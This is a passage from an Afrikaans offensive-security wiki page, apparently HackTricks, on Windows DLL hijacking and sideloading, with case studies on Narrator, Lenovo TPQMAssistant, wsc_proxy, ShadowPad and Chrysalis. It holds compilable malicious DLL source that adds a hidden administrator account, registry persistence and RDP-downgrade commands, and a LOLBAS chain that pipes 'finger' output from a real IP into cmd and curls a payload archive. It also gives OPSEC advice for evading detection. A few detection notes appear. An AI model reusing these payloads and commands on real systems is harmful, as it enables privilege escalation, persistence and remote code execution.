//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Toeganklikheid/AT's)

Windows Narrator.exe toets steeds met die begin voorspelbaar vir 'n taalspesifieke lokaliserings-DLL wat gekaap kan word vir arbitrêre kode-uitvoering en volharding.<sup>[[7]](#references)</sup>

Kernfeite
- Toetspad (huidige bouweergawes): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Verouderde pad (ouer bouweergawes): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As 'n skryfbare, deur die aanvaller beheerde DLL by die OneCore-pad bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` word uitgevoer. Geen uitvoere word vereis nie.

Ontdekking met Procmon
- Filter: `Process Name is Narrator.exe` en `Operation is Load Image` of `CreateFile`.
- Begin Narrator en neem die poging waar om die bogenoemde pad te laai.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC-stilte
- ’n Naïewe hijack sal die UI laat praat/verlig. Om stil te bly, lys Narrator se threads wanneer dit aangeheg word, maak die hoofthread oop (`OpenThread(THREAD_SUSPEND_RESUME)`) en laat loop `SuspendThread` daarop; gaan voort in jou eie thread. Sien PoC vir die volledige kode.<sup>[[8]](#references)</sup>

Sneller en volharding via Accessibility-konfigurasie
- Gebruikerskonteks (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde laai die begin van Narrator die geplante DLL. Op die veilige werkskerm (aanmeldskerm), druk CTRL+WIN+ENTER om Narrator te begin; jou DLL word as SYSTEM op die veilige werkskerm uitgevoer.

RDP-gesnellerde SYSTEM-uitvoering (laterale beweging)
- Laat die klassieke RDP-sekuriteitslaag toe: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Koppel via RDP aan die gasheer; druk CTRL+WIN+ENTER op die aanmeldskerm om Narrator te begin; jou DLL word as SYSTEM op die veilige werkskerm uitgevoer.
- Uitvoering stop wanneer die RDP-sessie sluit—inject/migreer dadelik.

Bring Your Own Accessibility (BYOA)
- Jy kan ’n ingeboude Accessibility Tool (AT)-registerinskrywing (bv. CursorIndicator) kloon, dit wysig om na ’n arbitrêre binary/DLL te verwys, dit invoer en dan `configuration` op daardie AT-naam stel. Dit gebruik die Accessibility-raamwerk as ’n proxy vir arbitrêre uitvoering.

Notas
- Om na `%windir%\System32` te skryf en HKLM-waardes te verander, vereis adminregte.
- Alle payload-logika kan in `DLL_PROCESS_ATTACH` wees; uitvoere is nie nodig nie.

## Gevallestudie: CVE-2025-1729 - Voorregte-eskalasie met TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), wat as **CVE-2025-1729** opgespoor word.<sup>[[2]](#references)[[3]](#references)</sup>

### Besonderhede van die kwesbaarheid

- **Komponent**: `TPQMAssistant.exe`, geleë in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geskeduleerde taak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` loop daagliks om 9:30 vm. in die konteks van die aangemelde gebruiker.
- **Gidstoestemmings**: `CREATOR OWNER` het skryftoegang, wat plaaslike gebruikers toelaat om arbitrêre lêers daar te plaas.
- **DLL-soekgedrag**: Probeer eers `hostfxr.dll` uit sy werkgids laai en teken "NAME NOT FOUND" aan as dit ontbreek, wat aandui dat die plaaslike gids voorrang geniet tydens soektogte.

### Uitbuitingsimplementering

’n Aanvaller kan ’n kwaadwillige `hostfxr.dll`-stub in dieselfde gids plaas en die ontbrekende DLL uitbuit om kode in die gebruiker se konteks uit te voer:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Aanvalvloei

1. Plaas as ’n standaardgebruiker `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag totdat die geskeduleerde taak om 9:30 vm. in die huidige gebruiker se konteks loop.
3. As ’n administrateur aangemeld is wanneer die taak loop, word die kwaadwillige DLL in die administrateur se sessie met medium-integriteit uitgevoer.
4. Kombineer standaard UAC-bypass-tegnieke om van medium-integriteit na SYSTEM-regte te eskaleer.

## Gevallestudie: MSI CustomAction-dropper + DLL-side-loading via ’n ondertekende gasheer (wsc_proxy.exe)

Bedreigingsakteurs kombineer dikwels MSI-gebaseerde droppers met DLL-side-loading om payloads onder ’n vertroude, ondertekende proses uit te voer.<sup>[[10]](#references)</sup>

Ketoorsig
- Die gebruiker laai ’n MSI af. ’n CustomAction loop stilweg tydens die GUI-installasie (bv. LaunchApplication of ’n VBScript-aksie) en rekonstrueer die volgende stadium uit ingebedde hulpbronne.
- Die dropper skryf ’n wettige, ondertekende EXE en ’n kwaadwillige DLL na dieselfde gids (voorbeeldpaar: Avast-ondertekende wsc_proxy.exe + aanvaller-beheerde wsc.dll).
- Wanneer die ondertekende EXE begin word, laai Windows se DLL-soekvolgorde eers wsc.dll uit die werkgids en voer dit uit onder ’n ondertekende ouerproses (ATT&CK T1574.001).

MSI-analise (waarna om te kyk)
- CustomAction-tabel:
  - Soek inskrywings wat uitvoerbare lêers of VBScript laat loop. Voorbeeld van ’n verdagte patroon: LaunchApplication wat ’n ingebedde lêer in die agtergrond uitvoer.
  - Inspekteer in Orca (Microsoft Orca.exe) die CustomAction-, InstallExecuteSequence- en Binary-tabelle.
- Ingebedde/verdeelde payloads in die MSI CAB:
  - Administratiewe ekstraksie: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Of gebruik lessmsi: lessmsi x package.msi C:\out
  - Soek na verskeie klein fragmente wat deur ’n VBScript CustomAction aaneengeskakel en ontsyfer word. Algemene vloei:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde vouer:
  - wsc_proxy.exe: wettige, ondertekende gasheer (Avast). Die proses probeer om wsc.dll volgens naam vanuit sy vouer te laai.
  - wsc.dll: aanvaller-DLL. As geen spesifieke exports vereis word nie, kan DllMain voldoende wees; anders bou ’n proxy-DLL en stuur vereiste exports aan die egte library deur terwyl die payload in DllMain uitgevoer word.
- Bou ’n minimale DLL-payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Vir exportvereistes, gebruik ’n proxying framework (bv. DLLirant/Spartacus) om ’n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek maak staat op DLL-naambepaling deur die gasheerbinêre lêer. As die gasheer absolute paaie of veilige laaivlae gebruik (bv. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan die hijack misluk.
- KnownDLLs, SxS en forwarded exports kan die voorrang beïnvloed en moet in ag geneem word wanneer die gasheerbinêre lêer en export-stel gekies word.

## Getekende triades + geënkripteerde payloads (ShadowPad-gevallestudie)

Check Point het beskryf hoe Ink Dragon ShadowPad ontplooi met ’n **drie-lêer-triade** om by wettige sagteware in te skakel terwyl die kernpayload geënkripteer op skyf bly:<sup>[[12]](#references)</sup>

1. **Getekende gasheer-EXE** – verskaffers soos AMD, Realtek of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die aanvallers hernoem die uitvoerbare lêer sodat dit soos ’n Windows-binêre lêer lyk (byvoorbeeld `conhost.exe`), maar die Authenticode-handtekening bly geldig.
2. **Kwaadwillige loader-DLL** – word langs die EXE geplaas met ’n verwagte naam (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik ’n MFC-binêre lêer wat met die ScatterBrain-framework verduister is; sy enigste taak is om die geënkripteerde blob op te spoor, dit te dekripteer en ShadowPad reflektief te map.
3. **Geënkripteerde payload-blob** – word dikwels in dieselfde gids as `<name>.tmp` gestoor. Nadat die loader die gedekripteerde payload in geheue gemap het, verwyder dit die TMP-lêer om forensiese bewyse uit te wis.

Tradecraft-notas:

* Deur die getekende EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE-kopskrif behou word), kan dit hom as ’n Windows-binêre lêer voordoen en steeds die verskaffer se handtekening behou. Boots dus Ink Dragon se gewoonte na om `conhost.exe`-agtige binêre lêers te plaas wat eintlik AMD/NVIDIA-hulpprogramme is.
* Omdat die uitvoerbare lêer vertroud bly, hoef die meeste allowlisting-kontroles net toe te laat dat jou kwaadwillige DLL langsaan geplaas word. Fokus op die pasmaak van die loader-DLL; die getekende ouerproses kan gewoonlik onveranderd loop.
* ShadowPad se decryptor verwag dat die TMP-blob langs die loader lê en skryfbaar is sodat dit die lêer kan nulstel nadat dit gemap is. Hou die gids skryfbaar totdat die payload gelaai is; sodra dit in geheue is, kan die TMP-lêer veilig vir OPSEC verwyder word.

### LOLBAS-stager + staged-argief-sideloading-ketting (finger → tar/curl → WMI)

Operateurs kombineer DLL sideloading met LOLBAS sodat die kwaadwillige DLL langs die vertroude EXE die enigste pasgemaakte artefak op skyf is:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Versteekte PowerShell begin `cmd.exe /c`, haal opdragte van ’n Finger-bediener af en stuur dit deur na `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` haal TCP/79-teks op; `| cmd` voer die bediener se reaksie uit, sodat operateurs die second stage aan die bedienerkant kan roteer.

- **Ingeboude aflaai/onttrekking:** Laai ’n argief met ’n onskadelike uitbreiding af, pak dit uit en plaas die sideload-teiken plus DLL in ’n ewekansige `%LocalAppData%`-lêergids:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` verberg vordering en volg herleidings; `tar -xf` gebruik Windows se ingeboude tar.

- **WMI/CIM-bekendstelling:** Begin die EXE via WMI sodat telemetrie ’n CIM-geskepte proses wys terwyl dit die DLL in dieselfde gids laai:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Werk met binaries wat plaaslike DLLs verkies (bv. `intelbq.exe`, `nearby_share.exe`); die payload (bv. Remcos) loop onder die vertroude naam.

- **Opsporing:** Stel ’n waarskuwing in vir `forfiles` wanneer `/p`, `/m` en `/c` saam voorkom; dit is ongewoon buite admin-skripte.


## Gevallestudie: NSIS-dropper + Bitdefender Submission Wizard-sideload (Chrysalis)

’n Onlangse Lotus Blossom-inbraak het ’n vertroude opdateringsketting misbruik om ’n NSIS-gepakte dropper af te lewer wat ’n DLL-sideload plus payloads wat volledig in die geheue loop, voorberei het.<sup>[[13]](#references)</sup>

Tradecraft-vloei
- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit as **HIDDEN**, plaas ’n hernoemde Bitdefender Submission Wizard `BluetoothService.exe`, ’n kwaadwillige `log.dll` en ’n geënkripteerde blob `BluetoothService` daar, en begin dan die EXE.
- Die gasheer-EXE voer `log.dll` in en roep `LogInit`/`LogWrite` aan. `LogInit` laai die blob met mmap; `LogWrite` dekripteer dit met ’n pasgemaakte LCG-gebaseerde stroom (konstantes **0x19660D** / **0x3C6EF35F**, sleutelmateriaal afgelei van ’n vorige hash), oorskryf die buffer met gewone teks-shellcode, maak tydelike data vry en spring daarnaar.
- Om ’n IAT te vermy, los die loader APIs op deur uitvoernaam-hashes te bereken met **FNV-1a-basis 0x811C9DC5 + priemgetal 0x1000193**, en pas dan ’n Murmur-styl-avalanche (**0x85EBCA6B**) toe en vergelyk dit met gesoute teikenhashes.

Hoof-shellcode (Chrysalis)
- Dekripteer ’n PE-agtige hoofmodule deur add/XOR/sub met sleutel `gQ2JR&9;` oor vyf passe te herhaal, en laai dan `Kernel32.dll` → `GetProcAddress` dinamies om die invoerresolusie te voltooi.
- Herbou DLL-naamstringe tydens looptyd met per-karakter bit-rotate/XOR-transformasies, en laai dan `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Gebruik ’n tweede resolver wat deur die **PEB → InMemoryOrderModuleList** loop, elke uitvoertabel in 4-greep-blokke met Murmur-styl-menging ontleed, en slegs na `GetProcAddress` terugval as die hash nie gevind word nie.

Ingebedde konfigurasie & C2
- Die konfigurasie is in die afgelaaide `BluetoothService`-lêer by **offset 0x30808** (grootte **0x980**) en word met sleutel `qwhvb^435h&*7` met RC4 gedekripteer, wat die C2-URL en User-Agent openbaar.
- Beacons stel ’n kolpuntgeskeide gasheerprofiel saam, voeg die merker `4Q` vooraan, en enkripteer dit dan met RC4 met sleutel `vAuig34%^325hGV` voordat dit oor HTTPS na `HttpSendRequestA` gestuur word. Antwoorde word met RC4 gedekripteer en deur ’n merkerskakelaar (`4T` shell, `4V` prosesuitvoering, `4W/4X` lêerskryf, `4Y` lees/uittrek, `4\\` verwydering, `4` skyf-/lêer-enum + gevalle vir stukgewyse oordrag) verwerk.
- Die uitvoeringsmodus word deur CLI-argumente beheer: geen argumente = installeer persistence (diens/Run-sleutel) wat na `-i` wys; `-i` herbegin self met `-k`; `-k` slaan installasie oor en laat die payload loop.

Alternatiewe loader waargeneem
- Dieselfde inbraak het Tiny C Compiler afgelaai en `svchost.exe -nostdlib -run conf.c` uitgevoer vanaf `C:\ProgramData\USOShared\`, met `libtcc.dll` daarby. Die aanvaller-verskafde C-bron het shellcode ingebed, is saamgestel en in die geheue uitgevoer sonder om ’n PE na die skyf te skryf. Herhaal met:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Hierdie TCC-gebaseerde compile-and-run-fase het `Wininet.dll` tydens looptyd ingevoer en ’n tweede-fase-shellcode van ’n hardgekodeerde URL afgehaal. Dit het ’n buigsame loader opgelewer wat hom as ’n compiler-uitvoering voordoen.

## Signed-host-sideloading met export-proxying + host-thread-parking

Sommige DLL-sideloading-kettings voeg **stabiliteitsingenieurswese** by sodat die legitieme host lank genoeg aktief bly om latere stadiums skoon te laai, eerder as om te crash nadat die kwaadwillige DLL gelaai is.<sup>[[11]](#references)</sup>

Waargenome patroon
- Plaas ’n vertroude EXE langs ’n kwaadwillige DLL met die verwagte afhanklikheidsnaam, soos `version.dll`.
- Die kwaadwillige DLL **proxy elke verwagte export** na die werklike stelsel-DLL (byvoorbeeld `%SystemRoot%\\System32\\version.dll`), sodat import-resolusie steeds slaag en die host-proses aanhou werk.
- Ná laai **patch** die kwaadwillige DLL die host se entry point sodat die hooftread in ’n oneindige `Sleep`-lus beland, eerder as om te eindig of kodepaaie uit te voer wat die proses sou beëindig.
- ’n Nuwe thread voer die werklike kwaadwillige werk uit: dit dekripteer die volgende-fase-DLL se naam of pad (RC4/XOR word dikwels gebruik) en begin dit dan met `LoadLibrary`.

Waarom dit saak maak
- Gewone DLL-proxying behou API-versoenbaarheid, maar waarborg nie dat die host lank genoeg aktief bly vir latere stadiums nie.
- Om die hooftread met `Sleep(INFINITE)` te laat wag, is ’n eenvoudige manier om die getekende proses aktief te hou terwyl die loader in ’n worker thread dekripsie, staging of netwerk-inisialisering uitvoer.
- As daar net na ’n verdagte `DllMain` gesoek word, kan hierdie patroon gemis word wanneer die interessante gedrag plaasvind nadat die host se entry point gepatch is en ’n sekondêre thread begin.

Minimale werkvloei
1. Kopieer die getekende host-EXE en bepaal watter DLL dit uit die plaaslike gids laai.
2. Bou ’n proxy-DLL wat dieselfde funksies export en dit na die legitieme DLL aanstuur.
3. Skep in `DllMain(DLL_PROCESS_ATTACH)` ’n worker thread.
4. Patch vanuit daardie thread die host se entry point of die hooftread se beginroetine sodat dit in ’n `Sleep`-lus beland.
5. Dekripteer die volgende-fase-DLL se naam/konfigurasie en roep `LoadLibrary` aan, of map die payload handmatig.

Verdedigingspunte
- Getekende prosesse wat `version.dll` of soortgelyke algemene biblioteke uit hul eie toepassinggids laai in plaas van uit `System32`.
- Geheuepatches by die proses se entry point kort ná die beeld gelaai is, veral spronge/aanroepe wat na `Sleep`/`SleepEx` herlei word.
- Threads wat deur ’n proxy-DLL geskep word en onmiddellik `LoadLibrary` aanroep op ’n tweede DLL met ’n gedekripteerde naam.
- Proxy-DLL’s wat al die exports bevat en langs verkoper-uitvoerbare lêers in skryfbare staging-gidse geplaas word, soos `ProgramData`, `%TEMP%` of paaie na uitgepakte argiewe.

## References

- [1] [Red Canary – Inligtingsinsigte: Januarie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Voorregte-eskalasie met TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL-hijacking in Windows. Eenvoudige C-voorbeeld.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore ontplooi nuwe malware wat Europa teiken](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wanneer DLL-hijacks Windows Helpers ontmoet](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitale dubbelgangers: Anatomie van ontwikkelende nabootsingsveldtogte wat Gh0st RAT versprei](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Belange kom bymekaar: Ontleding van bedreigingsgroepe wat ’n Suidoos-Asiatiese regering teiken](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Binne Ink Dragon: Die onthulling van die aflosnetwerk en innerlike werking van ’n geheimsinnige offensiewe operasie](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Die Chrysalis Backdoor: ’n Diepgaande blik op Lotus Blossom se toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL-hijack-ketting](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Opsporing van Iranian APT Screening Serpens se spioenasieveldtogte van 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Vinnig en woedend: Nimbus Manticore se operasies tydens die Iranse konflik](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Taakaksies](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 teiken Suidoos-Asiatiese regerings en kritieke infrastruktuur](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
